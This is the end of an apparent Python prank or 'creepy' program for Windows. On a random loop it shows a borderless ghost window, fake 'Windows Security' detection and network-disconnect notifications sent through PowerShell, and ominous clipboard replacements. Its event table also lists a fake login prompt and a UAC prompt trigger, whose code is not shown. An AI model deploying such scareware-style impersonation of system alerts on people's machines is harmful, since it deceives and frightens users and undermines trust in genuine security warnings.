def ghost_window_event():
    """
    Ventana fantasma: crea una ventana sin bordes con título "(null)" que no tiene
    contenido visible, se coloca en una posición aleatoria y desaparece tras 800 ms.
    """
    if not tk:
        return

    try:
        root = tk.Tk()
        root.withdraw()
    except Exception:
        return

    screen_w = ctypes.windll.user32.GetSystemMetrics(0)
    screen_h = ctypes.windll.user32.GetSystemMetrics(1)

    # Tamaño pequeño y posición aleatoria
    w, h = 320, 120
    x = random.randint(0, max(0, screen_w - w))
    y = random.randint(0, max(0, screen_h - h))

    top = tk.Toplevel(root)
    top.overrideredirect(True)          # sin bordes ni cabecera
    top.geometry(f"{w}x{h}+{x}+{y}")
    top.title("(null)")
    top.attributes("-topmost", True)
    # Opcional: aspecto tenue para que parezca "fantasma"
    try:
        top.attributes("-alpha", 0.85)
    except Exception:
        pass

    # No añadimos widgets ni bindings, la ventana parece vacía y no responde
    # Cerrar tras 800 ms (mismo hilo)
    top.after(800, root.destroy)
    root.mainloop()

def defender_investigation_event():
    """
    'Windows Security — Detection: Unknown entity null (Pending analysis)'
    1) Intenta toast WinRT con plantilla (AUMID 'null' que ya te funciona).
    2) Lanza globo de bandeja como refuerzo.
    3) Fallback garantizado: mini-toast con Tk en esquina inferior derecha 5s.
    """
    # print("[DEFENDER_INVESTIGATION] Intentando WinRT + balloon + fallback Tk")

    # # === (1) Toast WinRT con plantilla simple y AUMID 'null' ===
    # ps_toast = r'''
    # try {
    #     [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
    #     $tpl = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
    #     $texts = $tpl.GetElementsByTagName("text")
    #     $texts.Item(0).AppendChild($tpl.CreateTextNode("Windows Security")) | Out-Null
    #     $texts.Item(1).AppendChild($tpl.CreateTextNode("App & browser control — Detection: Unknown entity null (Pending analysis)")) | Out-Null
    #     $toast = [Windows.UI.Notifications.ToastNotification]::new($tpl)
    #     $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("null")
    #     $notifier.Show($toast)
    # } catch {}
    # '''
    # try:
    #     subprocess.Popen(
    #         ["powershell", "-NoProfile", "-Command", ps_toast],
    #         stdout=subprocess.DEVNULL,
    #         stderr=subprocess.DEVNULL
    #     )
    # except Exception as e:
    #     print(f"[DEFENDER_INVESTIGATION] PS toast error: {e}")

    # === (2) Globo de bandeja como refuerzo (no bloquea) ===
    ps_balloon = r'''
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $ni = New-Object System.Windows.Forms.NotifyIcon
        $ni.Icon = [System.Drawing.SystemIcons]::Shield
        $ni.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
        $ni.BalloonTipTitle = "Windows Security"
        $ni.BalloonTipText = "App & browser control — Detection: Unknown entity null (Pending analysis)"
        $ni.Visible = $true
        $ni.ShowBalloonTip(5000)
        Start-Sleep -Seconds 6
        $ni.Dispose()
    } catch {}
    '''
    try:
        subprocess.Popen(
            ["powershell", "-NoProfile", "-Command", ps_balloon],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"[DEFENDER_INVESTIGATION] PS balloon error: {e}")

    # === (3) Fallback garantizado: mini "toast" con Tk en esquina inferior derecha ===
    # if not tk:
    #     return  # si no hay Tk, ya hemos hecho (1) y (2)

    # try:
    #     root = tk.Tk()
    #     root.overrideredirect(True)
    #     root.attributes("-topmost", True)
    #     try:
    #         root.attributes("-alpha", 0.96)
    #     except Exception:
    #         pass

    #     # Dimensiones pantalla y "toast"
    #     sw = ctypes.windll.user32.GetSystemMetrics(0)
    #     sh = ctypes.windll.user32.GetSystemMetrics(1)
    #     w, h = 340, 100
    #     x = sw - w - 16
    #     y = sh - h - 48
    #     root.geometry(f"{w}x{h}+{x}+{y}")

    #     # Estilo básico tipo Seguridad de Windows
    #     frame = tk.Frame(root, bg="#1F1F1F")
    #     frame.pack(fill="both", expand=True)
    #     t1 = tk.Label(frame, text="Windows Security", bg="#1F1F1F", fg="white", font=("Segoe UI", 10, "bold"))
    #     t1.pack(anchor="w", padx=10, pady=(8, 0))
    #     t2 = tk.Label(frame, text="App & browser control", bg="#1F1F1F", fg="#C8C8C8", font=("Segoe UI", 9))
    #     t2.pack(anchor="w", padx=10)
    #     t3 = tk.Label(frame, text="Detection: Unknown entity null (Pending analysis)", bg="#1F1F1F", fg="#C8C8C8", font=("Segoe UI", 9))
    #     t3.pack(anchor="w", padx=10, pady=(0, 8))

    #     # Cierre en 5s
    #     root.after(5000, root.destroy)
    #     root.mainloop()
    # except Exception as e:
    #     print(f"[DEFENDER_INVESTIGATION] Tk fallback error: {e}")

def clipboard_tamper_event():
    """
    Reemplaza el contenido del portapapeles por un mensaje inquietante durante 4s
    y luego restaura el contenido anterior (si es recuperable).
    """
    if not tk:
        return

    try:
        root = tk.Tk()
        root.withdraw()
    except Exception:
        return

    # Guardar contenido previo del clipboard (si lo hay)
    prior = None
    try:
        prior = root.clipboard_get()
    except Exception:
        prior = None

    # Mensaje temporal a poner
    tamper_messages = [
        "They are watching you",
        "Do not trust this machine",
        "wake up",
        "err.type=null"
    ]
    msg = random.choice(tamper_messages)

    try:
        root.clipboard_clear()
        root.clipboard_append(msg)
        root.update()  # asegurar que el clipboard se actualiza
    except Exception:
        # si no se puede modificar, simplemente salir
        try:
            root.destroy()
        except:
            pass
        return

    # Restaurar tras 4 segundos sin usar hilos: after() en mismo hilo
    def _restore_and_close():
        try:
            if prior is not None:
                root.clipboard_clear()
                root.clipboard_append(prior)
                root.update()
        except Exception:
            pass
        finally:
            try:
                root.destroy()
            except:
                pass

    root.after(4000, _restore_and_close)
    root.mainloop()

def fake_network_disconnect_event():
    """
    Muestra una notificación tipo toast indicando "Network disconnected".
    No corta la conexión real; es solo una notificación simulada.
    """
    ps_script = r'''
    [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
    $template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
    $textNodes = $template.GetElementsByTagName("text")
    $textNodes.Item(0).AppendChild($template.CreateTextNode("Network"))
    $textNodes.Item(1).AppendChild($template.CreateTextNode("Network disconnected. Check your connection."))
    $toast = [Windows.UI.Notifications.ToastNotification]::new($template)
    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("null")
    $notifier.Show($toast)
    '''
    try:
        subprocess.Popen(
            ["powershell", "-NoProfile", "-Command", ps_script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

# --------------------------------------------
# Lista de eventos actualizada
# --------------------------------------------

EVENTS = [
    "ERROR_MESSAGE",
    "OPEN_CMD",
    "OPEN_NOTEPAD",
    "OPEN_START_MENU",
    "MINIMIZE_ALL",
    "PLAY_SOUND",
    "LOWER_VOLUME",
    "MULTI_ERR_WINDOWS",
    "FLASH_BLACK",
    "TOAST_NOTIFICATION",
    "INVALID_EXPLORER",
    "TRAY_BALLOON",
    "NARRATOR_WHISPER",
    "HARDWARE_SOUND",
    "WEBCAM_LIGHT",
    "TEXT_OVERLAY",
    "OPEN_MAPS_LOCATION",
    "UAC_PROMPT",
    "HARDWARE_DISCONNECT_SOUND",
    "GHOST_CURSOR",
    "GHOST_TYPING",
    "GHOST_TYPING_FAST",
    "OMINOUS_TEMP_FILES",
    "CREEPY_SEARCH",
    "FAKE_LOGIN_PROMPT",
    "SYSTEM_TIME_ALTERATION",
    "TYPING_ERROR",
    "EYE_FLASH",
    "GHOST_WINDOW",
    "DEFENDER_INVESTIGATION",
    "CLIPBOARD_TAMPER"
]

# Diccionario que asocia cada nombre de evento a su función
EVENT_FUNCTIONS = {
    "ERROR_MESSAGE": show_random_error_box,
    "OPEN_CMD": open_cmd_window,
    "OPEN_NOTEPAD": open_notepad,
    "OPEN_START_MENU": open_start_menu,
    "MINIMIZE_ALL": minimize_all_windows,
    "PLAY_SOUND": play_random_windows_sound,
    "LOWER_VOLUME": lower_volume_one_step,
    "MULTI_ERR_WINDOWS": open_multiple_error_windows,
    "FLASH_BLACK": flash_black_window,
    "TOAST_NOTIFICATION": show_toast_notification,
    "INVALID_EXPLORER": open_invalid_explorer,
    "TRAY_BALLOON": show_tray_balloon,
    "NARRATOR_WHISPER": narrator_whisper,
    "HARDWARE_SOUND": play_hardware_disconnect_sound,
    "WEBCAM_LIGHT": webcam_light_event,
    "TEXT_OVERLAY": text_overlay_event,
    "OPEN_MAPS_LOCATION": open_maps_current_location,
    "UAC_PROMPT": trigger_uac_prompt,
    "HARDWARE_DISCONNECT_SOUND": play_hardware_disconnect_sound2,
    "GHOST_CURSOR": ghost_cursor,
    "GHOST_TYPING": ghost_typing,
    "GHOST_TYPING_FAST": ghost_typing_fast,
    "OMINOUS_TEMP_FILES": create_ominous_temp_files,
    "CREEPY_SEARCH": open_creepy_search,
    "FAKE_LOGIN_PROMPT": fake_login_prompt,
    "SYSTEM_TIME_ALTERATION": system_time_alteration,
    "FAKE_SYSTEM_UPDATE": fake_system_update,
    "TYPING_ERROR": typing_error_message,
    "EYE_FLASH": eye_flash_event,
    "GHOST_WINDOW": ghost_window_event,
    "DEFENDER_INVESTIGATION": defender_investigation_event,
    "CLIPBOARD_TAMPER": clipboard_tamper_event,
    "FAKE_NETWORK_DISCONNECT": fake_network_disconnect_event
}

def main():
    """
    Recorre todos los eventos en ciclos aleatorios:
      1) Toma la lista EVENTS
      2) La baraja (random.shuffle)
      3) Ejecuta cada evento en ese orden, imprimiendo su nombre y esperando un intervalo aleatorio
      4) Cuando termina todos, vuelve a barajar y repite
    """
    event_names = list(EVENTS)

    try:
        while True:
            random.shuffle(event_names)
            for name in event_names:
                interval = random.randint(500, 1000)
                time.sleep(interval)
                print(f"[EVENT] {name}")
                func = EVENT_FUNCTIONS.get(name)
                if func:
                    func()
                else:
                    print(f"[WARNING] No function found for event: {name}")
    except KeyboardInterrupt:
        print("\n[+] Interrupted by user, exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()

    